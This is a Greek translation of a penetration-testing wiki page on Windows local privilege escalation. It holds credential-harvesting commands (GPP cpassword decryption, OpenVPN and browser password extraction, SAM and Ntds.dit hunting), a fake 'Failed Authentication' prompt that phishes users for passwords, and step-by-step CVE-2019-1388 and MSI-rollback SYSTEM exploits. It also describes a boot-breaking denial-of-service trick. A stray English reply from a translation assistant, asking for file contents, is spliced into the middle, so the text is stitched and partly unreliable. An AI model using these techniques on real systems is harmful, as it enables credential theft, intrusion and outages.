Υπήρχε προηγουμένως μια λειτουργία που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά προβλήματα ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), που αποθηκεύονται ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα από οποιονδήποτε χρήστη του domain. Δεύτερον, οι κωδικοί μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό δημιουργούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να μειωθεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά αποθηκευμένα αρχεία GPP που περιέχουν το πεδίο "cpassword" και δεν είναι κενό. Όταν εντοπίσει τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό και επιστρέφει ένα προσαρμοσμένο PowerShell object. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, βοηθώντας στην ταυτοποίηση και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ για αυτά τα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για να αποκτήσετε τους κωδικούς:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα του web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε credentials

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα credentials του ή ακόμα και τα credentials ενός διαφορετικού χρήστη** αν νομίζετε ότι μπορεί να τα ξέρει (σημειώστε ότι το **να ζητήσετε** απευθείας από τον πελάτη τα **credentials** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν credentials**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md. Please paste the file contents (or the list of proposed files you want searched) or confirm where I should search. Once you provide the text or files, I'll translate the relevant English to Greek while preserving all markdown/html/tags/links/paths exactly as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στο RecycleBin

Θα πρέπει επίσης να ελέγξετε τον Bin για να βρείτε διαπιστευτήρια μέσα σε αυτόν

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκεύσει διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά registry keys με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Πρέπει να ελέγξετε για dbs όπου αποθηκεύονται passwords από **Chrome ή Firefox**.\
Επίσης ελέγξτε το ιστορικό, τα bookmarks και τα favourites των browsers ώστε ίσως κάποια **passwords** να είναι αποθηκευμένα εκεί.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την **επικοινωνία** μεταξύ συστατικών λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component **ταυτοποιείται μέσω ενός class ID (CLSID)** και κάθε component εκθέτει λειτουργίες μέσω μιας ή περισσότερων interfaces, ταυτοποιούμενων μέσω interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32** που περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή με το όνομα **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **overwrite any of the DLLs** που πρόκειται να εκτελεστούν, θα μπορούσατε να **escalate privileges** αν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική Password αναζήτηση σε αρχεία και registry**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτηση στο μητρώο για ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα msf** plugin. Έχω δημιουργήσει αυτό το plugin για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμα εξαιρετικό εργαλείο για να εξάγει passwords από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** πολλών εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα shared memory segments, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία μεταξύ διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν τη δυνατότητα των **Named Pipes**, επιτρέποντας σε μη σχετιζόμενες διεργασίες να μοιράζονται δεδομένα, ακόμα και σε διαφορετικά δίκτυα. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους ορισμένους ως **named pipe server** και **named pipe client**.

Όταν δεδομένα στέλνονται μέσω ενός pipe από έναν **client**, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **προσομοιώσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Η ανακάλυψη μιας **privileged process** που επικοινωνεί μέσω ενός pipe που μπορείτε να μιμηθείτε προσφέρει την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια** υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που δημιουργήσατε. Για οδηγίες εκτέλεσης μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επιπλέον, το ακόλουθο εργαλείο επιτρέπει να **παρεμβληθείτε σε επικοινωνία named pipe με ένα εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει να απαριθμήσετε και να δείτε όλα τα pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν scheduled tasks ή άλλες διεργασίες που εκτελούνται και οι οποίες **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας οποιεσδήποτε διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών από διεργασίες

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στη γραφική διεπαφή (via console or RDP) και το UAC είναι ενεργοποιημένο, σε κάποιες εκδόσεις του Microsoft Windows είναι δυνατό να τρέξετε ένα terminal ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" ως μη προνομιούχος χρήστης.

Αυτό καθιστά δυνατή την κλιμάκωση προνομίων και την παράκαμψη του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα ακόλουθα:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, πρέπει να ακολουθήσετε τα παρακάτω βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Έχεις όλα τα απαραίτητα αρχεία και πληροφορίες στο ακόλουθο GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διάβασε αυτό για να **μάθεις για τα Επίπεδα Ακεραιότητας**:


{{#ref}}
integrity-levels.md
{{#endref}}

Έπειτα **διάβασε αυτό για να μάθεις για το UAC και τις παρακάμψεις UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Διαγραφή/Μετακίνηση/Μετονομασία Οποιονδήποτε Φακέλου σε SYSTEM EoP

Η τεχνική που περιγράφεται [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με κώδικα exploit [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση ουσιαστικά συνίσταται στην εκμετάλλευση της δυνατότητας rollback του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό ο attacker πρέπει να δημιουργήσει ένα **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για να καταλάβει το φάκελο `C:\Config.Msi`, ο οποίος θα χρησιμοποιηθεί αργότερα από τον Windows Installer για την αποθήκευση αρχείων rollback κατά την απεγκατάσταση άλλων MSI πακέτων, όπου τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Βήμα 1: Εγκατάσταση του MSI
- Δημιούργησε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
- Σήμανε τον installer ως **"UAC Compliant"**, ώστε ένας **χρήστης χωρίς δικαιώματα διαχειριστή** να μπορεί να το τρέξει.
- Κράτα ένα **handle** ανοιχτό προς το αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκίνα την απεγκατάσταση
- Απεγκατάστησε το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
- **Poll το ανοιχτό handle αρχείου** χρησιμοποιώντας `GetFinalPathNameByHandle` για να ανιχνεύσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Προσαρμοσμένος συγχρονισμός
- Το `.msi` περιλαμβάνει μια **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί πότε έχει γραφτεί το `.rbf`.
- Έπειτα **περιμένει** σε άλλο event πριν συνεχίσει την απεγκατάσταση.

- Βήμα 4: Εμπόδιση διαγραφής του `.rbf`
- Όταν ληφθεί το σήμα, **άνοιξε το `.rbf` αρχείο** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
- Έπειτα **σήμανε πίσω** ώστε η απεγκατάσταση να ολοκληρωθεί.
- Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **το `C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Χειροκίνητη διαγραφή του `.rbf`
- Εσύ (attacker) διαγράφεις το `.rbf` χειροκίνητα.
- Τώρα **το `C:\Config.Msi` είναι κενό**, έτοιμο για κατάληψη.

> Σε αυτό το σημείο, **trigger το SYSTEM-level arbitrary folder delete vulnerability** για να διαγραφεί το `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Βήμα 6: Αναδημιούργησε το `C:\Config.Msi` με Αδύναμα ACLs
- Αναδημιούργησε τον φάκελο `C:\Config.Msi` ο ίδιος.
- Θέσε **αδύναμα DACLs** (π.χ., Everyone:F), και **κράτα ένα handle ανοιχτό** με `WRITE_DAC`.

- Βήμα 7: Τρέξε άλλη εγκατάσταση
- Εγκατέστησε το `.msi` ξανά, με:
- `TARGETDIR`: Εγγράψιμη τοποθεσία.
- `ERROROUT`: Μια μεταβλητή που προκαλεί αναγκαστική αποτυχία.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, που διαβάζει `.rbs` και `.rbf`.

- Βήμα 8: Παρακολούθησε για `.rbs`
- Χρησιμοποίησε `ReadDirectoryChangesW` για να παρακολουθείς το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Κατέγραψε το όνομα αρχείου.

- Βήμα 9: Συγχρονισμός πριν το Rollback
- Το `.msi` περιέχει μια **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργείται το `.rbs`.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Επαναεφαρμογή Αδύναμου ACL
- Αφού λάβεις το event `(.rbs created)`:
- Ο Windows Installer **επαναφέρει ισχυρά ACLs** στο `C:\Config.Msi`.
- Αλλά επειδή εξακολουθείς να έχεις ένα handle με `WRITE_DAC`, μπορείς **να επαναεφαρμόσεις αδύναμα ACLs** ξανά.

> Τα ACLs εφαρμόζονται **μόνο κατά το άνοιγμα του handle**, οπότε εξακολουθείς να μπορείς να γράψεις στο φάκελο.

- Βήμα 11: Τοποθέτησε ψεύτικα `.rbs` και `.rbf`
- Υπερχώρισέ το `.rbs` αρχείο με ένα **ψεύτικο rollback script** που λέει στον Windows να:
- Επαναφέρει το `.rbf` σου (malicious DLL) σε μια **προνομιακή τοποθεσία** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Θέσε το ψεύτικο `.rbf` που περιέχει μια **κακόβουλη SYSTEM-level payload DLL**.

- Βήμα 12: Εκκίνησε το Rollback
- Σήμανε το sync event ώστε ο installer να συνεχίσει.
- Μια **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί να **προκαλέσει σκόπιμα την αποτυχία της εγκατάστασης** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σου
- Ο Windows Installer:
- Διαβάζει το κακόβουλο `.rbs` σου.
- Αντιγράφει το `.rbf` DLL σου στην στοχευμένη τοποθεσία.
- Πλέον έχεις το **κακόβουλο DLL σε ένα path που φορτώνεται από SYSTEM**.

- Τελικό Βήμα: Εκτέλεση κώδικα ως SYSTEM
- Τρέξε ένα αξιόπιστο **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει το DLL που κατέλαβες.
- **Boom**: Ο κώδικάς σου εκτελείται **ως SYSTEM**.


### Από Διαγραφή/Μετακίνηση/Μετονομασία Αρχείου σε SYSTEM EoP

Η κύρια τεχνική rollback με MSI (η προηγούμενη) υποθέτει ότι μπορείς να διαγράψεις έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Αλλά τι γίνεται αν το vulnerability σου επιτρέπει μόνο **arbitrary file deletion**;

Μπορείς να εκμεταλλευτείς τα εσωτερικά του NTFS: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, εάν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε αυτό χρησιμοποιώντας τυπικά APIs διαγραφής αρχείων όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ακόμα κι αν καλείς ένα *file* delete API, αυτό **διαγράφει τον ίδιο το φάκελο**.

### Από τη Διαγραφή Περιεχομένων Φακέλου σε SYSTEM EoP
Τι γίνεται αν η primitive σου δεν επιτρέπει να διαγράψεις αυθαίρετα αρχεία/φακέλους, αλλά **σου επιτρέπει τη διαγραφή των *περιεχομένων* ενός attacker-controlled folder**;

1. Βήμα 1: Δημιούργησε έναν δολωματικό φάκελο και αρχείο
- Δημιούργησε: `C:\temp\folder1`
- Μέσα σε αυτό: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια privileged process προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίηση της διαδικασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διαδικασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει το περιεχόμενό τους.
- Όταν φτάσει στο `file1.txt`, το **oplock ενεργοποιείται** και παραδίδει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψετε το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει το NTFS internal stream που αποθηκεύει τα metadata του φακέλου — η διαγραφή του διαγράφει το φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διαδικασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από SYSTEM.

### Από τη Δημιουργία Αυθαίρετου Φακέλου σε Μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου driver των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή αντιστοιχεί συνήθως στον kernel-mode driver `cng.sys`.
- Εάν το **δημιουργήσετε εκ των προτέρων ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπει το φάκελο, **αποτυγχάνει να επιλύσει τον πραγματικό driver**, και **καταρρέει ή σταματά η εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση**, και **καμία ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επισκευή εκκίνησης ή πρόσβαση στο δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

